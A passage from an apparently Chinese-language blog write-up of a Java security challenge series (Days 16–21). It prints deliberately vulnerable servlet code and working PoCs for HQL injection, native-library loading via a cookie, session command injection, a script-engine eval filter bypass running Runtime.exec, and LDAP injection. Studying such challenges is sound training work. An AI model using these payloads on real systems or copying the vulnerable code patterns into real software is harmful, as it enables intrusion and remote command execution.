class="string">"FIRST_NAME"</span>, unique = <span class="keyword">false</span>, nullable = <span class="keyword">false</span>, length = <span class="number">100</span>)</span><br><span class="line">  <span class="keyword">private</span> String firstName;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Column</span>(name = <span class="string">"LAST_NAME"</span>, unique = <span class="keyword">false</span>, nullable = <span class="keyword">false</span>, length = <span class="number">100</span>)</span><br><span class="line">  <span class="keyword">private</span> String lastName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.hibernate.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FindController</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">escapeQuotes</span><span class="params">(String in)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> in.replaceAll(<span class="string">"'"</span>,<span class="string">"''"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@RequestMapping</span>(<span class="string">"/findUsers"</span>)</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">findUsers</span><span class="params">(@RequestParam(name=<span class="string">"name"</span>)</span> String name, HttpServletResponse res) <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">    Configuration config = <span class="keyword">new</span> Configuration();</span><br><span class="line">    <span class="comment">// Create SessionFactory with MySQL driver</span></span><br><span class="line">    SessionFactory sessionFactory = config.configure().buildSessionFactory();</span><br><span class="line">    Session session = sessionFactory.openSession();</span><br><span class="line">    List &lt;UserEntity&gt; users = session.createQuery(<span class="string">"from UserEntity where FIRST_NAME ='"</span> + escapeQuotes(name) + <span class="string">"'"</span>, UserEntity.class).list();</span><br><span class="line">    res.getWriter().println(<span class="string">"Found "</span> + users.size() + <span class="string">" Users with that name"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很明显的注入，只是简单的将单引号替换两个单引号,那么我们只需要用一个简单的转义符就可以绕过,例如”\”符号.<br>poc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test\&apos; or 1=sleep(1) -- -</span><br></pre></td></tr></table></figure></p>
<h3 id="防御措施-10"><a href="#防御措施-10" class="headerlink" title="防御措施"></a>防御措施</h3><p>TODO</p>
<h2 id="Day-17-Carol-Singers"><a href="#Day-17-Carol-Singers" class="headerlink" title="Day 17 - Carol Singers"></a>Day 17 - Carol Singers</h2><h3 id="Source-15"><a href="#Source-15" class="headerlink" title="Source"></a>Source</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaDeobfuscatorStartupController</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isInBlacklist</span><span class="params">(String input)</span> </span>&#123;</span><br><span class="line">    String[] blacklist = &#123;<span class="string">"java"</span>,<span class="string">"os"</span>,<span class="string">"file"</span>&#125;;</span><br><span class="line">    <span class="keyword">return</span> Arrays.asList(blacklist).contains(input);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setEnv</span><span class="params">(String key, String value)</span> </span>&#123;</span><br><span class="line">    String[] values = key.split(Pattern.quote(<span class="string">"."</span>));</span><br><span class="line">    <span class="keyword">if</span> (isInBlacklist(values[<span class="number">0</span>])) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    List&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;(Arrays.asList(values));</span><br><span class="line">    list.removeAll(Arrays.asList(<span class="string">""</span>, <span class="keyword">null</span>));</span><br><span class="line">    String property = String.join(<span class="string">"."</span>, list);</span><br><span class="line">    System.setProperty(property, value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">loadEnv</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">    Cookie[] cookies = request.getCookies();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cookies.length; i++)</span><br><span class="line">      <span class="keyword">if</span> (cookies[i].getName().equals(<span class="string">"env"</span>)) &#123;</span><br><span class="line">        String[] tmp = cookies[i].getValue().split(<span class="string">"@"</span>, <span class="number">2</span>);</span><br><span class="line">        setEnv(tmp[<span class="number">0</span>], tmp[<span class="number">1</span>]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">uploadFile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Secure file upload with arbitrary content type and extension in known path /var/myapp/data</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    loadEnv(request);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">final</span> Field sysPathsField = ClassLoader.class.getDeclaredField(<span class="string">"sys_paths"</span>);</span><br><span class="line">      sysPathsField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">      sysPathsField.set(<span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">      System.loadLibrary(<span class="string">"DEOBFUSCATION_LIB"</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      response.sendRedirect(<span class="string">"/"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第一步 先上传恶意库文件，第二步给他加载进去.上传恶意库文件名则必须为libDEOBFUSCATION_LIB.so,第二步我们则需要给他加载进去，我们需要修改java库文件路径.<br>poc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v --cookie &apos;env=.java.library.path@/var/myapp/data&apos;</span><br></pre></td></tr></table></figure></p>
<p>java加载库文件 命名规则:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Windows: &quot;hello&quot; -&gt; &quot;hello.dll&quot;</span><br><span class="line">Linux/Solaris: &quot;hello&quot; &quot;libhello.so&quot;</span><br><span class="line">Mac: &quot;hello&quot; -&gt; &quot;libhello.dylib&quot;</span><br></pre></td></tr></table></figure></p>
<h3 id="防御措施-11"><a href="#防御措施-11" class="headerlink" title="防御措施"></a>防御措施</h3><p>TODO</p>
<h2 id="Day-18-Reindeer"><a href="#Day-18-Reindeer" class="headerlink" title="Day 18 - Reindeer"></a>Day 18 - Reindeer</h2><h3 id="Source-16"><a href="#Source-16" class="headerlink" title="Source"></a>Source</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.http.fileupload.IOUtils;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoadConfig</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;String, String&gt; <span class="title">parseRequest</span><span class="params">(String value)</span> </span>&#123;</span><br><span class="line">    HashMap&lt;String, String&gt; result = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line">    <span class="keyword">if</span> (value != <span class="keyword">null</span>) &#123;</span><br><span class="line">      String tmp[] = value.split(<span class="string">"@"</span>);</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; tmp.length; i = i + <span class="number">2</span>) &#123;</span><br><span class="line">        result.put(tmp[i], tmp[i + <span class="number">1</span>]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (request.getParameter(<span class="string">"home"</span>) != <span class="keyword">null</span>) &#123;</span><br><span class="line">      HttpSession session = request.getSession(<span class="keyword">true</span>);</span><br><span class="line">      <span class="keyword">if</span> (!session.isNew())&#123;</span><br><span class="line">        <span class="keyword">if</span> (validBasicAuthHeader()) &#123; <span class="comment">// Checks the Basic Authorization header (password check)</span></span><br><span class="line">          <span class="comment">// Execute last command:</span></span><br><span class="line">          ProcessBuilder processBuilder = <span class="keyword">new</span> ProcessBuilder();</span><br><span class="line">          processBuilder.command((String)session.getAttribute(<span class="string">"last_command"</span>));</span><br><span class="line">          <span class="keyword">try</span> &#123;</span><br><span class="line">            Process process = processBuilder.start();</span><br><span class="line">            IOUtils.copy(process.getInputStream(), response.getOutputStream());</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (request.getParameter(<span class="string">"save_session"</span>) != <span class="keyword">null</span>) &#123;</span><br><span class="line">      String value = request.getParameter(<span class="string">"config"</span>);</span><br><span class="line">      HashMap&lt;String, String&gt; config = parseRequest(value);</span><br><span class="line">      <span class="keyword">for</span> (String i : config.keySet()) &#123;</span><br><span class="line">        Cookie settings = <span class="keyword">new</span> Cookie(i, config.get(i));</span><br><span class="line">        response.addCookie(settings);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      HttpSession session = request.getSession(<span class="keyword">true</span>);</span><br><span class="line">      <span class="keyword">if</span> (session.isNew()) &#123;</span><br><span class="line">        HashMap&lt;String, String&gt; whitelist = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line">        whitelist.put(<span class="string">"home"</span>, <span class="string">"yes"</span>);</span><br><span class="line">        whitelist.put(<span class="string">"role"</span>, <span class="string">"frontend"</span>);</span><br><span class="line"></span><br><span class="line">        String value = request.getParameter(<span class="string">"config"</span>);</span><br><span class="line">        HashMap&lt;String, String&gt; config = parseRequest(value);</span><br><span class="line"></span><br><span class="line">        whitelist.putAll(config);</span><br><span class="line">        <span class="keyword">for</span> (String i : whitelist.keySet()) &#123;</span><br><span class="line">          session.setAttribute(i, whitelist.get(i));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>明显的命令注入，第一步我们要让被执行的命令放到session里，第二步，去执行就完事了。<br>第一步 我们需要通过config参数，将我们要执行的命令放到session里，?config=last_command@whoami，第二步，我们去执行一下，?home=yes.但是我看了官方的writeup，他中间加了一步，就是将自己的session给管理员，然后让管理员绕过check，最后执行命令.官方的writeup<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http://victim.org/?config=last_command@ls&quot; -v</span><br><span class="line">Send link to admin and execute the following requests in the background:</span><br><span class="line">http://victim.org/?config=JSESSIONID@D4E9132DB9703009B1C932E7C37286ED&amp;save_session=yes</span><br><span class="line">http://victim.org/?home=yes</span><br></pre></td></tr></table></figure></p>
<h2 id="Day-19-Gingerbread"><a href="#Day-19-Gingerbread" class="headerlink" title="Day 19 - Gingerbread"></a>Day 19 - Gingerbread</h2><h3 id="Source-17"><a href="#Source-17" class="headerlink" title="Source"></a>Source</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.script.ScriptEngineManager;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngine;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RenderExpression</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      ScriptEngineManager scriptEngineManager = <span class="keyword">new</span> ScriptEngineManager();</span><br><span class="line">      ScriptEngine scriptEngine = scriptEngineManager.getEngineByExtension(<span class="string">"js"</span>);</span><br><span class="line"></span><br><span class="line">      String dynamiceCodeHere = request.getParameter(<span class="string">"p"</span>);</span><br><span class="line">      <span class="keyword">if</span> (!dynamiceCodeHere.startsWith(<span class="string">"\""</span>)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      Pattern p = Pattern.compile(<span class="string">"([^\".()'\\/,a-zA-z\\s\\\\])|(processbuilder|file|url|runtime|getclass|forname|loadclass|new\\s)"</span>);</span><br><span class="line">      Matcher m = p.matcher(dynamiceCodeHere.toLowerCase());</span><br><span class="line">      <span class="keyword">if</span> (m.find()) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      scriptEngine.eval(dynamiceCodeHere);</span><br><span class="line">      <span class="comment">// Proceed</span></span><br><span class="line">    &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">      response.sendRedirect(<span class="string">"/"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里我们要构造一个命令注入，p参数的值需双引号开头，然后又过滤了一些常见的执行命令的方法。我是没构造出来怎么注入，参考一下官方吧。巧妙的使用””空字符串，然后调用equals方法，去利用ScriptEnginemanger的eval方法进行反射执行，中间还利用replaceAll绕过了过滤，真巧妙啊。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">victim.org/?p=&quot;&quot;.equals(javax.script.ScriptEngineManager.class.getConstructor().newInstance().getEngineByExtension(&quot;js&quot;).eval(&quot;java.lang.Auntime.getAuntime().exec(\&quot;touch /tmp/owned.jsp\&quot;)&quot;.replaceAll(&quot;A&quot;,&quot;R&quot;)))</span><br></pre></td></tr></table></figure></p>
<h3 id="防御措施-12"><a href="#防御措施-12" class="headerlink" title="防御措施"></a>防御措施</h3><p>TODO</p>
<h2 id="Day-20-Ornaments"><a href="#Day-20-Ornaments" class="headerlink" title="Day 20 - Ornaments"></a>Day 20 - Ornaments</h2><h3 id="Source-18"><a href="#Source-18" class="headerlink" title="Source"></a>Source</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.*;</span><br><span class="line"><span class="keyword">import</span> javax.naming.directory.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">  <span class="comment">// This token is SHA-256(createTimestamp of admin user)</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String api_token = <span class="string">"1c4e98fc43d0385e67cd6de8c32f969f371eba8ab84053858b5bfd21a2adb471"</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">executeCommand</span><span class="params">(String user_token, String[] cmd)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (user_token.equals(api_token)) &#123;</span><br><span class="line">      <span class="comment">// Execute shell command</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Current attributes of objectClass "simpleSecurityObject":</span></span><br><span class="line"><span class="comment">   * createtimestamp, creatorsname, dn, entrycsn, entrydn, entryuuid, objectclass, userpassword, uuid</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> DirContext <span class="title">initLdap</span><span class="params">()</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    Hashtable&lt;String, Object&gt; env = <span class="keyword">new</span> Hashtable&lt;String, Object&gt;();</span><br><span class="line">    env.put(Context.SECURITY_AUTHENTICATION, <span class="string">"simple"</span>);</span><br><span class="line">    env.put(Context.SECURITY_PRINCIPAL, <span class="string">"cn=admin,dc=example,dc=org"</span>);</span><br><span class="line">    env.put(Context.SECURITY_CREDENTIALS, <span class="string">"admin"</span>);</span><br><span class="line">    env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">"com.sun.jndi.ldap.LdapCtxFactory"</span>);</span><br><span class="line">    env.put(Context.PROVIDER_URL, <span class="string">"ldap://127.0.0.1:389/"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> InitialDirContext(env);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">userExists</span><span class="params">(DirContext ctx, String username)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    String[] security_blacklist = &#123;<span class="string">"uuid"</span>, <span class="string">"userpassword"</span>, <span class="string">"surname"</span>, <span class="string">"mail"</span>, <span class="string">"givenName"</span>, <span class="string">"name"</span>, <span class="string">"cn"</span>, <span class="string">"sn"</span>, <span class="string">"objectclass"</span>, <span class="string">"|"</span>, <span class="string">"&amp;"</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (String name : security_blacklist) &#123;</span><br><span class="line">      <span class="keyword">if</span> (username.contains(name)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String searchFilter = <span class="string">"(&amp;(objectClass=simpleSecurityObject)(uid="</span>+username+<span class="string">"))"</span>;</span><br><span class="line">    SearchControls searchControls = <span class="keyword">new</span> SearchControls();</span><br><span class="line">    searchControls.setSearchScope(SearchControls.SUBTREE_SCOPE);</span><br><span class="line">    NamingEnumeration&lt;SearchResult&gt; results = ctx.search(<span class="string">"dc=example,dc=org"</span>, searchFilter, searchControls);</span><br><span class="line">    <span class="keyword">if</span> (results.hasMoreElements()) &#123;</span><br><span class="line">      SearchResult searchResult = (SearchResult) results.nextElement();</span><br><span class="line">      <span class="keyword">return</span> searchResult != <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      DirContext ctx = initLdap();</span><br><span class="line">      <span class="keyword">if</span>(userExists(ctx, request.getParameter(<span class="string">"username"</span>)))&#123;</span><br><span class="line">        response.getOutputStream().print(<span class="string">"User is found."</span>);</span><br><span class="line">        response.getOutputStream().close();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      response.sendRedirect(<span class="string">"/"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一个ldap注入，但是过滤了一些关键词，不过我们可以对createTimestamp进行注入，所以我们可以构造poc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?username=admin)(createTimestamp=2*</span><br><span class="line">?username=admin)(createTimestamp=20*</span><br></pre></td></tr></table></figure></p>
<p>猜出来createTimestamp然后进行命令执行。</p>
<h3 id="防御措施-13"><a href="#防御措施-13" class="headerlink" title="防御措施"></a>防御措施</h3><p>TODO</p>
<h2 id="Day-21-Snowman"><a href="#Day-21-Snowman" class="headerlink" title="Day 21 - Snowman"></a>Day 21 - Snowman</h2><h3 id="Source-19"><a href="#Source-19" class="headerlink" title="Source"></a>Source</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.crypto.*;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Hex;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Decrypter</span></span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="meta">@RequestMapping</span>(<span class="string">"/decrypt"</span>)</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">decrypt</span><span class="params">(HttpServletResponse req, HttpServletResponse res)</span> <span class="keyword">throws</span> IOException, NoSuchAlgorithmException, InvalidAlgorithmParameterException, InvalidKeyException, IllegalBlockSizeException, NoSuchPaddingException, DecoderException, InvalidKeySpecException </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Payload to decrypt: 699c99a4f27a4e4c310d75586abe8d32a8fc21a1f9e400f22b1fec7b415de5a4</span></span><br><span class="line">    <span class="keyword">byte</span>[] cipher = Hex.decodeHex(req.getParameter(<span class="string">"c"</span>));</span><br><span class="line">    <span class="keyword">byte</span>[] salt = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;(<span class="keyword">byte</span>)<span class="number">0x12</span>,(<span class="keyword">byte</span>)<span class="number">0x34</span>,(<span class="keyword">byte</span>)<span class="number">0x56</span>,(<span class="keyword">byte</span>)<span class="number">0x78</span>,(<span class="keyword">byte</span>)<span class="number">0x9a</span>,(<span class="keyword">byte</span>)<span class="number">0xbc</span>,(<span class="keyword">byte</span>)<span class="number">0xde</span>&#125;;</span><br><span class="line">    <span class="comment">// Extract IV.</span></span><br><span class="line">    <span class="keyword">byte</span>[] iv = <span class="keyword">new</span> <span class="keyword">byte</span>[<span 